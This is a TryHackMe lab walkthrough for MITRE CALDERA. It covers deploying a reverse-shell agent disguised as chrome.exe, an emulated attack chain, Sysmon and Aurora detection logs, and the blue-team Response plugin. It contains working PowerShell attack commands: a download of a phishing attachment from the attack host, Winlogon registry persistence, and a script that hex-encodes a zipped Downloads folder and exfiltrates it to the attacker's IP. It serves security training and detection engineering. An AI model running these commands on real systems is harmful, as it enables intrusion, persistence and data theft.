# TryHackMe: Caldera Guide

Room URL: https://tryhackme.com/room/caldera

**Table of Contents:**

- Breakdown of CALDERA's core terminologies and functionalities.
- Application of planning and grouping of adversarial use cases.
- Automation of Incident Response via CALDERA.
- Implications of threat emulation to detection engineering.

## **CALDERA** Overview

**CALDERA** is an open-source framework built by **MITRE** for running **autonomous adversary emulation** exercises. It is based on the **MITRE ATT&CK®** framework and is used to test security defenses by simulating real-world attacks.

**Primary Use Cases:**

1. **Autonomous Red Team Engagements:** Automatically emulating known adversary profiles to identify security gaps.
2. **Manual Red Team Engagements:** Providing a customizable platform for red teams to execute custom TTPs.
3. **Autonomous Incident Response:** Enabling blue teams to perform automated detection and response actions.

**Core Terminologies:**

- **Agents:** Implants (e.g., Sandcat, Manx) deployed on target systems that communicate with the CALDERA server to receive and execute commands.
- **Abilities:** Implementations of specific ATT&CK techniques (commands, payloads) that agents run.
- **Adversaries:** Groups of abilities bundled together to mimic the TTPs of a known threat actor.
- **Operations:** The process of running an adversary profile's abilities on a selected group of agents.
- **Plugins:** Modules that extend CALDERA's core functionality (e.g., Sandcat agent, Training, Response).

**Key Operation Concepts:**

- **Planners:** Determine the order of ability execution (e.g., Atomic, Batch).
- **Facts:** Pieces of information about a target system that some abilities require to run.
- **Obfuscators:** Used to hide commands from detection before execution.
- **Jitter:** Controls how often agents check in with the server.

In essence, CALDERA is a versatile tool that allows security teams to automate the emulation of cyber attacks (red teaming) and the response to them (blue teaming) within a single, ATT&CK-based platform.

## Running Operations with CALDERA

To start with, let's follow this guide to emulate a single adversary profile successfully:

1. Run the CALDERA instance.
2. Deploy an agent in the target machine.
3. Choose the adversary profile and review the abilities to be executed.
4. Run the operation.
5. Review the results.

﻿
**Connecting to the CALDERA Instance** 

<img width="1100" height="540" alt="image" src="https://github.com/user-attachments/assets/6a948aef-0edc-45bd-9a8c-d85d45385f72" />

**Prerequisites:**

- Two machines: one running the **CALDERA server** (on the AttackBox) and a **Windows victim machine**.
- CALDERA web access credentials: Username **`red`**, Password **`admin`**.

**First# Start CALDERA Server:** On the AttackBox, navigate to the CALDERA directory, activate its Python virtual environment, and start the server with **`python server.py --insecure`**. Wait for the "All systems ready" message.

```powershell
root@ip-10-10-1-65:~/Rooms/caldera/caldera# source ../caldera_venv/bin/activate
(caldera_venv) root@ip-10-10-1-65:~/Rooms/caldera/caldera# python server.py --insecure

```

<img width="1027" height="349" alt="image" src="https://github.com/user-attachments/assets/3981ec11-2fd2-4f1e-ab05-2210f23428fe" />

**Second# Deploy an Agent:** An agent (implant) must be deployed on the victim machine to receive commands from CALDERA.

- In the CALDERA web UI, go to the 'Agents' tab and deploy a **`Manx`** (TCP reverse shell) agent for Windows.
- Configure the agent: Set the IP address to the AttackBox's IP and give the implant a deceptive name (e.g., **`chrome.exe`**).
- Copy the generated PowerShell command from CALDERA and execute it on the victim machine. This downloads and runs the agent.

<img width="1367" height="720" alt="image" src="https://github.com/user-attachments/assets/299dd218-58c8-4f8f-a5ee-bfbeb807ca52" />

<img width="1400" height="572" alt="image" src="https://github.com/user-attachments/assets/062c58bf-f10f-4aee-881a-b34702c37c8d" />

<img width="1878" height="820" alt="image" src="https://github.com/user-attachments/assets/51eb10e1-cb02-4865-b9d7-ed107abafab0" />

<img width="1137" height="616" alt="image" src="https://github.com/user-attachments/assets/5db6ddeb-3c1c-441f-abe4-ae50490701ab" />

Copy the reverse shell agent and paste it into the victim server

<img width="1809" height="884" alt="image" src="https://github.com/user-attachments/assets/830b4e5f-1d04-4458-80a6-72f6e0331458" />

<img width="1734" height="853" alt="image" src="https://github.com/user-attachments/assets/d679e168-94d6-42a7-952d-2f3e8b0b1640" />

**Third#** **Select an Adversary Profile:** Choose a profile defining the attack techniques to emulate. The example uses the **"Enumerator"** profile, which contains five abilities for system enumeration.

- It is crucial to **review the abilities** beforehand to understand the commands that will be executed on the victim (e.g., **`WMIC Process Enumeration`**).

<img width="1430" height="826" alt="image" src="https://github.com/user-attachments/assets/678b41fe-93f9-4afa-8fbf-08ce0962fb48" />

<img width="1610" height="530" alt="image" src="https://github.com/user-attachments/assets/e1166e38-3de0-41f2-b803-dfd55ea7f315" />

 Click on the abilities to see the execution details.

<img width="1177" height="734" alt="image" src="https://github.com/user-attachments/assets/ff0978c4-012b-4d92-a0a6-46620156b20d" />

**Four# Execute the Operation:** Run the emulation by creating a new operation.

- Go to the 'Operations' tab and click 'Create Operation'.
- Key configuration:
    - **Adversary Profile:** Select the chosen profile (e.g., **`Enumerator`**).
    - **Group:** Set to **`red`** to target only the red team agents.
    - **Obfuscation:** Can be disabled for simplicity in this test.
- Start the operation. CALDERA will task the agent to execute the abilities in the profile sequentially.

<img width="1546" height="693" alt="image" src="https://github.com/user-attachments/assets/574adc10-b599-483a-b474-89bc16d5b50a" />

<img width="1896" height="750" alt="image" src="https://github.com/user-attachments/assets/1cbbc777-bf50-4cfb-b04d-0b3884634e69" />

**Five# Review the Results:** After the operation completes, review the results in the operation view.

- For each ability, you can click **"View Command"** to see what was run and **"View Output"** to see the results (stdout/stderr) from the victim machine.
- Note: Some abilities might fail; the operation can be rerun or continued as needed.

<img width="1125" height="292" alt="image" src="https://github.com/user-attachments/assets/e1572fe8-787f-4dc3-a3c6-811bab68c753" />

<img width="1156" height="702" alt="image" src="https://github.com/user-attachments/assets/17f77936-3674-4e8a-b771-2e119382eee6" />

Some commands may not return output, such as this command for SysInternals PSTool Process Discovery

<img width="1422" height="317" alt="image" src="https://github.com/user-attachments/assets/d6b01e56-b9fe-4ab4-b988-9126f14ce499" />

<img width="1301" height="402" alt="image" src="https://github.com/user-attachments/assets/53deb2c4-c02e-4cf8-a8c3-25834112b21d" />

## In-Through-Out

We executed a single adversary profile and its underlying abilities from the previous task. Now, we will attempt to customise the framework and emulate an attack chain that traverses from Initial Access to Achieving the Objective.

For this scenario, we will emulate the following techniques:

| **Tactic** | **Technique** | **Ability Name** |
| --- | --- | --- |
| **Initial Access** | Spearphishing Attachment (T1566.001) | Download Macro-Enabled Phishing Attachment |
| **Execution** | Windows Management Instrumentation (T1047) | Create a Process using WMI Query and an Encoded Command |
| **Persistence** | Boot or Logon Autostart Execution: Winlogon Helper DLL (T1547.004) | Winlogon HKLM Shell Key Persistence - PowerShell |
| **Discovery** | Account Discovery: Local Account (T1087.001) | Identify local users |
| **Collection** | Data Staged: Local Data Staging (T1074.001) | Zip a Folder with PowerShell for Staging in Temp |
| **Exfiltration** | Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (T1048.003) | Exfiltrating Hex-Encoded Data Chunks over HTTP |

### **Modifying Existing Abilities**

Since the victim machine dose not have an internet connection, we mush host the malicious file on our attacking machine for the victim to download. 

View the ability `Download Macro-Enabled Phishing Attachment` 

<img width="1412" height="680" alt="image" src="https://github.com/user-attachments/assets/f81ae3dc-005a-4fd9-8035-4aeb5188bd89" />

<img width="1131" height="726" alt="image" src="https://github.com/user-attachments/assets/6b41bce7-8fbc-4089-a2cd-1aecda7ea3eb" />

And change the URL to our attack IP machine and the listening port. Then save the ability

```powershell
$url = 'http://10.10.118.21:8080/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
```

<img width="1203" height="636" alt="image" src="https://github.com/user-attachments/assets/1a2f2ddf-09d5-43ec-8802-c446a2e91044" />

The second ability to customise is  `Zip a Folder with PowerShell for Staging in Temp`

<img width="791" height="292" alt="image" src="https://github.com/user-attachments/assets/9ab6f002-8af3-43ba-ae9b-56ff2c77b7b0" />

change the commands to this:

```powershell
# Attack Command
Compress-Archive -Path $env:USERPROFILE\Downloads -DestinationPath $env:TEMP\exfil.zip -Force

# Cheanup command
Remove-Item -Path $env:TEMP\exfil.zip -ErrorAction Ignore

```

<img width="1081" height="459" alt="image" src="https://github.com/user-attachments/assets/f2fa8580-aaca-4838-8a5a-fc91b4a89d38" />

### Creating a Custom Ability

the ability `Exfiltrating Hex-Encoded Data Chunks over HTTP` does not exist, so we must create a new ability to complete the emulation activity. The goal is to execute a command that exfiltrates the collected data from the `Zip a Folder with PowerShell for Staging in Temp` ability.

To do this, we will use the following PowerShell commands to hex-encode the data, split it into chunks, and send it to the existing HTTP listener (running on port 8080) from the AttackBox instance. 

```powershell
$file="$env:TEMP\exfil.zip"; $destination="http://10.10.118.21:8080/"; $bytes=[System.IO.File]::ReadAllBytes($file); $hex=($bytes|ForEach-Object ToString X2) -join ''; $split=$hex -split '(\S{20})' -ne ''; ForEach ($line in $split) { curl.exe "$destination$line" } echo "Done exfiltrating the data. Check your listener."

```

<img width="1114" height="640" alt="image" src="https://github.com/user-attachments/assets/19bf86ac-601b-488d-9bfe-96f17640a8ad" />

<img width="1174" height="638" alt="image" src="https://github.com/user-attachments/assets/5a53bfdf-e79c-4d0b-ac58-6dc9e4aa657d" />

Once done, save it.

<img width="973" height="475" alt="image" src="https://github.com/user-attachments/assets/381b315e-904e-4e14-82b5-500b67300dcb" />

### **Creating a Custom Adversary Profile**

Now that all abilities are prepered, create a new adversary profile by clicking on the **adversaries** tab > click **New Profile,** then fill the required fields

<img width="1418" height="718" alt="image" src="https://github.com/user-attachments/assets/3e104199-5fbc-440e-9cd1-1befb3c4eb6e" />

After creating, add Abilities by clicking on **Add Ability** option, then add all the above-mentioned abilities

<img width="1899" height="856" alt="image" src="https://github.com/user-attachments/assets/54097544-a373-4f49-884e-d8c3ce1ffe25" />

### **Running the Operation and Reviewing Results**

First, create a new operation by clicking on the **operation** tab, then configure the operation like this:

<img width="1207" height="795" alt="image" src="https://github.com/user-attachments/assets/4ab995f9-43a1-4629-9733-58b61f35092e" />

Before starting the operation, start the Python server to host the malicious file.

<img width="1721" height="820" alt="image" src="https://github.com/user-attachments/assets/cdbf1960-15f8-4aa1-959d-86e9022afcb5" />

**Initial Access**: Download Macro-Enabled Phishing Attachment

<img width="1335" height="366" alt="image" src="https://github.com/user-attachments/assets/fd0bb666-ef3c-413c-a3c2-4da26a1252a6" />

**Execution**: Create a Process using WMI Query and an Encoded Command

<img width="1202" height="292" alt="image" src="https://github.com/user-attachments/assets/0ef15ecd-a5f6-471e-b4e5-56946276c247" />

Decoded command:

```powershell
Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exeਊ
```

<img width="1188" height="588" alt="image" src="https://github.com/user-attachments/assets/c15d9df5-d413-491a-a46b-21fc959094b2" />

**Persistence**: Winlogon HKLM Shell Key Persistence - PowerShell

<img width="1262" height="329" alt="image" src="https://github.com/user-attachments/assets/074aa826-4139-4207-8fb0-b70fe343015a" />

**Discovery**: Identify local users

<img width="1289" height="307" alt="image" src="https://github.com/user-attachments/assets/3e18a4a9-87d9-4576-9b61-a1d3a2de497d" />

<img width="1174" height="613" alt="image" src="https://github.com/user-attachments/assets/2065be0a-bfbb-41af-b53b-03f7a2bc8296" />

Four accounts were identified: (Administrator, DefaultAccount, Guest, WDAGUtilityAccount)

**Collection**: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (T1048.003)

<img width="1119" height="273" alt="image" src="https://github.com/user-attachments/assets/279f165c-9d4b-4763-9c62-55088c53f31a" />

**Efiltration**: For the last ability, it didn't run till I modified it from the **adversary profile** and changed the executor to **psh** 

<img width="570" height="312" alt="image" src="https://github.com/user-attachments/assets/965a8333-10fd-4d92-8fc3-364c839a55de" />

```powershell

$file="$env:TEMP\exfil.zip"; $destination="http://10.10.1.65:8080/"; $bytes=[System.IO.File]::ReadAllBytes($file); $hex=($bytes|ForEach-Object ToString X2) -join ''; $split=$hex -split '(\S{20})' -ne ''; ForEach ($line in $split) { curl.exe "$destination$line" } echo "Done exfiltrating the data. Check your listener."
```

<img width="1307" height="340" alt="image" src="https://github.com/user-attachments/assets/7c118a37-50da-48f2-8373-c1e52cd7f1a6" />

<img width="1177" height="505" alt="image" src="https://github.com/user-attachments/assets/782e9888-0819-4e24-a29c-5231c1bfe57f" />

<img width="1652" height="734" alt="image" src="https://github.com/user-attachments/assets/bd741ce7-2d07-4514-95c5-2401c5850a18" />

There were 23 HTTP GET requests. If you want to decode the hex, combine all the hex values and save them to a file 

```powershell
504B03041400000008002E9B7D56A1A236FD430000005A0000001C000000446F776E6C6F6164735C73656E7369746976655F646174612E747874FBFFCF99219F218F219DA1882191A184A19421074C6782458B191419141842183280FC62200B4226027131432A583E13ACB60CC853604801EB4C64D063E065E0620000504B010214001400000008002E9B7D56A1A236FD430000005A0000001C0000000000000000000000000000000000446F776E6C6F6164735C73656E7369746976655F646174612E747874504B050600000000010001004A0000007D00000000    
```

Then decode it as a zip file

```powershell
root@ip-10-10-1-65:~/Rooms/caldera/http_server# ls
exfilterat.txt  ex.zip  PhishingAttachment.xlsm
root@ip-10-10-1-65:~/Rooms/caldera/http_server# ls
'Downloads\sensitive_data.txt'   exfilterat.txt   ex.zip   PhishingAttachment.xlsm
root@ip-10-10-1-65:~/Rooms/caldera/http_server# cat 'Downloads\sensitive_data.txt' 
\ufffd\ufffdCongratulations! This is a sensitive data.

```

## Emulation on Detection

Review the events generated by executing the emulation activity of the previous task. The logs provided are:

- Sysmon
- AuroraEDR

Rerun the operation and wait till it finishes, then review the logs. If you prefer to run abilities individually and review their logs. Create a new operation and check **Pause on Start.** Then run the operation by clicking on **Run 1 Link, w**hich will run one ability and pause when it finishes

<img width="1122" height="643" alt="image" src="https://github.com/user-attachments/assets/ab130dd1-6e7e-464a-9fcb-e2f47bb1edfc" />

If Aurora logs are not showing, check the expiration time; if it has expired, change the machine time. Then restart it from **services.msc**

<img width="944" height="692" alt="image" src="https://github.com/user-attachments/assets/77bea34f-45dc-4e6b-a690-1162f7e69c63" />

Machine time after I change it.

<img width="560" height="399" alt="image" src="https://github.com/user-attachments/assets/eaec061c-212a-4904-8842-b2aa55652bba" />

Check List of [EventID-AuroraAgent](https://aurora-agent-manual.nextron-systems.com/en/latest/usage/event-id-list.html)

### Initial Access: Download Macro-Enabled Phishing Attachment

EventID: 1

```
 RuleName - 
  UtcTime 2025-03-31 10:51:46.187 
  ProcessId 1012 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  Company Microsoft Corporation 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "$url = 'http://10.10.39.5:8080/PhishingAttachment.xlsm'; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm" 
  ParentProcessId 5464 

```

File Create EventID 11

```
UtcTime 2025-03-31 10:51:46.493 
  ProcessGuid {c5d2b969-73c2-67ea-4501-000000002901} 
  ProcessId 1012 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  TargetFilename C:\Users\Administrator\AppData\Local\Temp\2\PhishingAttachment.xlsm 
  CreationUtcTime 2025-08-08 09:14:32.351 
```

Network Connection Detection: EventID 3

```
 RuleName Proxy 
  UtcTime 2025-08-24 10:52:24.435 
  ProcessId 1012 
  Image <unknown process> 
  User - 
  Protocol tcp 
  Initiated true 
  SourceIsIpv6 false 
  SourceIp 10.10.4.48 
  SourceHostname VICTIM.eu-west-1.compute.internal 
  SourcePort 49974 
  SourcePortName - 
  DestinationIsIpv6 false 
  DestinationIp 10.10.39.5 
  DestinationHostname ip-10-10-39-5.eu-west-1.compute.internal 
  DestinationPort 8080 
  DestinationPortName - 

```

**Aurora Agent**: You may use this search filter, but it has an indexing issue, that is because the order and number of **`<Data>`** elements can vary between different events.

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName "Application" -FilterXPath "*[System[Provider[@Name='AuroraAgent'] and (EventID=1301)]]" |
>>     Sort-Object TimeCreated |
>>     ForEach-Object {
>>         [PSCustomObject]@{
>>             TimeCreated = $_.TimeCreated
>>             EventId = $_.Id
>>             Computer = $_.MachineName
>>             # Accessing the EventData by its index in the Properties array
>>             Alert = $_.Properties[0].Value  # "Filename IOC match found"
>>             Module = $_.Properties[1].Value # "Module: ApplyIOCs"
>>             ApplicationId = $_.Properties[2].Value # "ApplicationId:"
>>             CommandLine = $_.Properties[3].Value # The malicious command line
>>             TargetComputer = $_.Properties[4].Value # "Computer: VICTIM"
>>             # ... and so on for any other data points you need ...
>>             SuspiciousFile = $_.Properties[12].Value # "ImageFileName: splunkd.exe"
>>             ProcessId = $_.Properties[21].Value # "ProcessId: 5464"
>>             User = $_.Properties[30].Value # "User: VICTIM\Administrator"
>>             # The full message is also available
>>             FullMessage = $_.Message
>>         }
>>     }

```

Rule Matched:

```
1. Sigma rule match found: Suspicious Invoke-WebRequest Execution With DirectIP 
2. Sigma rule match found: PowerShell Web Download
3. Sigma rule match found: Change PowerShell Policies to an Insecure Level 
4. Sigma rule match found: Usage Of Web Request Commands And Cmdlets
```

### Execution: Create a Process using WMI Query and an Encoded Command

Sysmon Log. Event ID 1

```
UtcTime 2025-03-31 10:52:07.290 
  ProcessGuid {c5d2b969-73d7-67ea-4601-000000002901} 
  ProcessId 3492 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  Company Microsoft Corporation 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA" 
  ParentProcessId 5464 

```

Decoded base64

```powershell
Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
```

```
 EventData 
  RuleName - 
  UtcTime 2025-03-31 10:52:07.500 
  ProcessGuid {c5d2b969-73d7-67ea-4701-000000002901} 
  ProcessId 768 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  FileVersion 10.0.17763.1 (WinBuild.160101.0800) 
  Description Windows PowerShell 
  Product Microsoft® Windows® Operating System 
  Company Microsoft Corporation 
  OriginalFileName PowerShell.EXE 
  CommandLine "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA 
  ParentProcessId 3492 
  ParentImage C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  ParentCommandLine powershell.exe -ExecutionPolicy Bypass -C "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA" 
  ParentUser VICTIM\Administrator 

```

Target process

```
 RuleName - 
  UtcTime 2025-03-31 10:52:07.798 
  ProcessGuid {c5d2b969-73d7-67ea-4801-000000002901} 
  ProcessId 936 
  Image C:\Windows\System32\notepad.exe 
  FileVersion 10.0.17763.1697 (WinBuild.160101.0800) 
  Description Notepad 
  OriginalFileName NOTEPAD.EXE 
  CommandLine notepad.exe 
  ParentProcessId 4928 
  ParentImage C:\Windows\System32\wbem\WmiPrvSE.exe 
  ParentCommandLine C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding 
  ParentUser NT AUTHORITY\NETWORK SERVICE 

```

**Aurora Agent: Rule matched**

```
1. Sigma rule match found: Suspicious Execution of Powershell with Base64
2. Sigma rule match found: PowerShell Base64 Encoded Invoke Keyword  
```

### Persistence: Winlogon HKLM Shell Key Persistence - PowerShell

**Sysmon. EventID 1**

```
 RuleName - 
  UtcTime 2025-03-31 10:52:28.393 
  ProcessGuid {c5d2b969-73ec-67ea-4901-000000002901} 
  ProcessId 2796 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  Company Microsoft Corporation 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "Set-ItemProperty \"HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\\" \"Shell\" \"explorer.exe, C:\Windows\System32\cmd.exe\" -Force" 
  ParentProcessId 5464 

```

Sysmon. Registry Value Set 13

```
RuleName T1060 
  EventType SetValue 
  UtcTime 2025-03-31 10:52:28.664 
  ProcessId 2796 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  TargetObject HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell 
  Details explorer.exe, C:\Windows\System32\cmd.exe 
  User VICTIM\Administrator 

```

### Discover: Identify local users

Sysmon Log: Event ID 1

```
 UtcTime 2025-03-31 10:52:49.498 
  ProcessId 960 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "Get-WmiObject -Class Win32_UserAccount" 
  User VICTIM\Administrator 
  ParentProcessId 5464 

```

### Collection: Zip a Folder with PowerShell for Staging in Temp

Sysmon Log. Process Creation

```
UtcTime 2025-03-31 10:53:10.602 
  ProcessId 2112 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "Compress-Archive -Path $env:USERPROFILE\Downloads -DestinationPath $env:TEMP\exfil.zip -Force" 
  User VICTIM\Administrator 
  ParentProcessId 5464 
  ParentImage - 

```

Aurora Agent: Rule Matched:

```
1. Sigma rule match found: Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet
		Match_Strings: 'Compress-Archive -Path $env:USERPROFILE\\Downloads -DestinationPath $env:TEMP' in CommandLine
2. Sigma rule match found: Zip A Folder With PowerShell For Staging In Temp - PowerShell 
		Match_Strings: 'Compress-Archive -Path $env:USERPROFILE\\Downloads -DestinationPath $env:TEMP' in Data
		
```

### Exfiltration: Exfiltrating Hex-Encoded Data Chunks over HTTP

Sysmon Log: Process Creation

```
UtcTime 2025-03-31 10:53:31.707 
  ProcessGuid {c5d2b969-742b-67ea-4c01-000000002901} 
  ProcessId 1052 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "$file=\"$env:TEMP\exfil.zip\"; $destination=\"http://10.10.39.5:8080/\"; $bytes=[System.IO.File]::ReadAllBytes($file); $hex=($bytes|ForEach-Object ToString X2) -join ''; $split=$hex -split '(\S{20})' -ne ''; ForEach ($line in $split) { curl.exe \"$destination$line\" } echo \"Done exfiltrating the data. Check your listener.\"" 
  ParentProcessId 5464 

```

Process Creation. All the next 23 Curl.exe Process execution is to exfiltrate the file

<img width="855" height="683" alt="image" src="https://github.com/user-attachments/assets/5030c297-9e03-423a-9fb0-5df30d7eb79e" />

Then, 23 network connections are made to the attacker's machine

<img width="838" height="699" alt="image" src="https://github.com/user-attachments/assets/8b076001-c8c5-4136-ae73-993c3b9523dc" />

After the exfiltration is done, the cleanup command is executed

```
UtcTime 2025-03-31 10:55:12.814 
  ProcessId: 5116 
  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName: PowerShell.EXE 
  CommandLine: powershell.exe -ExecutionPolicy Bypass -C "Remove-Item -Path $env:TEMP\exfil.zip -ErrorAction Ignore" 
  ParentProcessId: 5464 
  
```

**Process Creation:**

```
 UtcTime 2025-03-31 10:55:13.917 
  ProcessGuid {c5d2b969-7491-67ea-6501-000000002901} 
  ProcessId 5824 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "Remove-ItemProperty -Path \"HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore" 
  ParentProcessId 5464 

```

**Registry Object Deleted or added: EventID 12**

```
 RuleName T1060 
  EventType DeleteValue 
  UtcTime 2025-03-31 10:55:14.179 
  ProcessGuid {c5d2b969-7491-67ea-6501-000000002901} 
  ProcessId 5824 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  TargetObject HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell 
  User VICTIM\Administrator 

```

**Process Create**

```
 RuleName - 
  UtcTime 2025-03-31 10:55:15.019 
  ProcessId 5508 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName: PowerShell.EXE 
  CommandLine: powershell.exe -ExecutionPolicy Bypass -C "Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore" 

```

**Aurora Agent Rule Matched:**

```
1. Sigma rule match found: HackTool - CrackMapExec PowerShell Obfuscation 
		Match_Strings: 'join \'\'; $split' in CommandLine, \powershell.exe in Image, PowerShell.EXE in OriginalFileName
```

## Autonomous Incident Response

Leverage CALDERA from the perspective of a blue teamer. Credentials for Blue teamer account: 

- username: blue
- password: admin

Note that the theme has changed to blue color and one of the tabs has changed from adversaries to defenders.

<img width="405" height="735" alt="image" src="https://github.com/user-attachments/assets/aad41ac8-f701-4b41-bb7c-e52ef1390fcc" />

The topics will be discussed in this task:

1. Introduction to the Response plugin.
2. Sources and Facts.
3. Incident Response Scenario
4. Running blue operations and reviewing results.

### Introduction to the Response plugin.

The Response plugin is the counterpart of the threat emulation plugins of CALDERA. It contains abilities that focus on detection and response actions

<img width="1596" height="697" alt="image" src="https://github.com/user-attachments/assets/1012d828-9a4b-4be5-9de5-a8162bf2c426" />

In the version of CALDERA used in this task, there are currently thirty-seven abilities and four defenders. As mentioned above, defenders are the counterpart of adversaries, which means these are the blue team profiles that contain abilities that execute detection and response actions. The current defenders available in this version are the following:

- Incident Responder
- Elastic Hunter
- Query Sysmon
- Task Hunte

**Response Plugin Abilities:** You may view the abilities available for the plugin by navigating to the abilities tab and filtering it with the response plugin, similar to the image below

<img width="321" height="202" alt="image" src="https://github.com/user-attachments/assets/8d35cb2b-5100-4c1f-8d76-49a2600b20a4" />

<img width="1834" height="694" alt="image" src="https://github.com/user-attachments/assets/1711f261-6d18-4726-979d-d9fc1610e20c" />

Compared to the adversaries' abilities that are mapped with MITRE ATT&CK Tactics and Techniques, the Response Plugin Abilities are classified by four different tactics, such as:

- **Setup** - Abilities that prepare information, such as baselines, that assists other abilities in determining outliers.
- **Detect** - Abilities that focus on finding suspicious behaviour by continuously acquiring information. Abilities under this tactic have the Repeatable field configured, meaning they will run and hunt as long as the operation runs.
- **Response** - Abilities that act on behalf of the user to initiate actions, such as killing a process, modifying firewall rules, or deleting a file.
- **Hunt** - Abilities that focus on searching for malicious Indicators of Compromise (IOCs) via logs or file hashes.

**Defender Profile**

There are fource defenders profile, we will focus on the Response profile. 

<img width="1801" height="593" alt="image" src="https://github.com/user-attachments/assets/178cfd35-fb52-458e-9bc5-589e08182b06" />

This profile contains abilities under three different tactics **(detection, hunt, response)**

<img width="1655" height="736" alt="image" src="https://github.com/user-attachments/assets/f119f381-1169-402f-bba0-e60984137d35" />

Some abilities are connected: “**to unlock, you need the key**.”

<img width="1549" height="611" alt="image" src="https://github.com/user-attachments/assets/961f81f8-4d6a-4878-aac3-ee75603dc00a" />

<img width="1536" height="608" alt="image" src="https://github.com/user-attachments/assets/8430caff-f6b8-422f-97e9-04eff1a4aa5b" />

the `Find unauthorized processes` ability unlocks the `remote.port.unauthorized` value, which is required by the  `Enable Outbound TCP/UDP firewall rule` ability to execute blocking unauthorized network connections successfully. 

**Key > unlock** 

- `Find unauthorized processes` > `Enable Outbound TCP/UDP firewall rule`
- `Find atypical open ports` > `Kill Rouge Process`
- `Hunt for known suspicious files` > `Delete known suspicious files`

**Reviewing Abilities**

Reviewing the commands executed by the abilities helps in understanding the commands executed and adjusting the configuration if needed. For example: check `Unauthorized process ability` Command for Windows platform

<img width="1085" height="568" alt="image" src="https://github.com/user-attachments/assets/1b4594e5-73a6-43ca-a6cb-cb62baf99be7" />

The command attempts to look for TCP connections with a specific outbound port and returns the process that initiated the network connection. You may see that it uses the `remote.port.unauthorized` value for the `-RemotePort` parameter.  However, this ability does not require any prerequisite abilities before its execution, which means it uses a **fact** preconfigured in our CALDERA instance. 

### Sources and Facts

As mentioned above, one of the abilities is using a fact during an operation. 

- **Facts** are identifiable pieces of data. May it be acquired by agents during the execution of abilities or loaded from preconfigured settings.
- **Sources** are groups of facts.

<img width="1793" height="706" alt="image" src="https://github.com/user-attachments/assets/d06e0d4a-03ce-4876-9bab-8b8e63f41248" />

<img width="1597" height="461" alt="image" src="https://github.com/user-attachments/assets/9f448422-4ac7-4cf8-8464-997bb34f0354" />

The source **response** has four facts, one of which is `remote.port.unauthorized` , which flags three ports as unauthorized: **7010, 7011, 7012.** We can add port 4444 as an unauthorized remote port.

<img width="459" height="336" alt="image" src="https://github.com/user-attachments/assets/18e85235-8526-4c42-93de-a16f054aa900" />

This is how the ability `Find unauthorized processes` will execute on the target machine

```powershell
# Execution N.1
Get-NetTCPConnection -RemotePort "7010" -EA silentlycontinue | where-object { write-host $_.OwningProcess }

# Execution N.2
Get-NetTCPConnection -RemotePort "7011" -EA silentlycontinue | where-object { write-host $_.OwningProcess }

# Execution N.3
